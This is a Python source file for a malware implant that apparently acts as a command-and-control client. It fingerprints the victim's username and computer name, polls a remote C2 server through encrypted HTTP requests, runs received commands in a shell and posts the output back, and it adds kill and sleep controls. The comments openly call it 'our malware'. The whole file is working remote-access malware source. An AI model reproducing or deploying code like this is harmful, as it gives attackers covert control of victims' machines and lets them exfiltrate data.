# For both Windows and Linux builds
from time import time, sleep
from requests import get, post, exceptions
from subprocess import run, PIPE, STDOUT
from encryption import cipher
from settings import PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER

# For Windows builds only
from os import getenv, chdir, getcwd

# For Linux builds only
# from os import getenv, uname, chdir, getcwd

# For a Windows OS, obtain unique identifying information
client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
          str(time()))

# # For a Linux OS, obtain unique identifying information
# client = (getenv("LOGNAME") + "@" + uname().nodename + "@" + str(time()))

# UTF-8 encode the client first to be able to encrypt it, but then we must decode it after the encryption
encrypted_client = cipher.encrypt(client.encode()).decode()


def post_to_server(message: str, response_path=RESPONSE):
    """ Function to encrypt data and then post it to the c2 server.  Accepts a message and a response path (optional)
     as arguments."""
    try:
        # Byte encode the message and then encrypt it before posting
        message = cipher.encrypt(message.encode())

        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message},
             headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return


# Try an HTTP GET request to the c2 server and retrieve a command; if it fails, keep trying forever
while True:
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
        print(response.status_code)
        # If we get a 404 status code from the server, raise an exception
        if response.status_code == 404:
            raise exceptions.RequestException
    except exceptions.RequestException:
        sleep(DELAY)
        continue

    # Retrieve the command via the decrypted and decoded content of the response object
    command = cipher.decrypt(response.content).decode()

    # If the command starts with 'cd ', slice out directory and chdir to it
    if command.startswith("cd "):
        directory = command[3:]
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"{directory} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You do not have permissions to access {directory}.\n")
        except OSError:
            post_to_server("There was an operating system error on the client.\n")
        else:
            post_to_server(getcwd(), CWD_RESPONSE)

    # The "client kill" command will shut down our malware; make sure we have persistence!
    elif command.startswith("client kill"):
        post_to_server(f"{client} has been killed.\n")
        exit()

    # The "client sleep SECONDS" command will silence our malware for a set amount of time
    elif command.startswith("client sleep "):
        try:
            delay = float(command.split()[2])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            post_to_server("You must enter in a positive number for the amount of time to sleep in seconds.\n")
        else:
            post_to_server(f"{client} will sleep for {delay} seconds.\n")
            sleep(delay)
            post_to_server(f"{client} is now awake.\n")

    # Else, run our operating system command and send the output to the c2 server
    else:
        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
        post_to_server(command_output.decode())
